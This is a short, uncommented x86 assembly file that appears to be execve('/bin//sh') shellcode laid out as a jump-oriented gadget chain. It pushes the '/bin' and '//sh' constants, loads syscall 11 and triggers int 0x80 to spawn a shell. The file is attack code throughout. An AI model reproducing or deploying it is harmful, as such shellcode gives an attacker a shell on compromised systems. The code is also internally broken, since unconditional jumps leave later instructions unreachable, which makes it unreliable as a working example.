section .text
global start
global main

start:
main:
push   ebp
mov    ebp, esp
mov    ecx, [esp + 76]
jmp    [ecx + 12]
push   0
jmp    [ecx + 24]
push   0x68732f2f
jmp    [ecx + 36]
push   0x6e69622f
jmp    [ecx + 48]
mov    esp, ebx
push   0
push   ebx
jmp    [ecx + 60]
mov    esp, ecx
mov    al, 0xb
int    0x80
ret
leave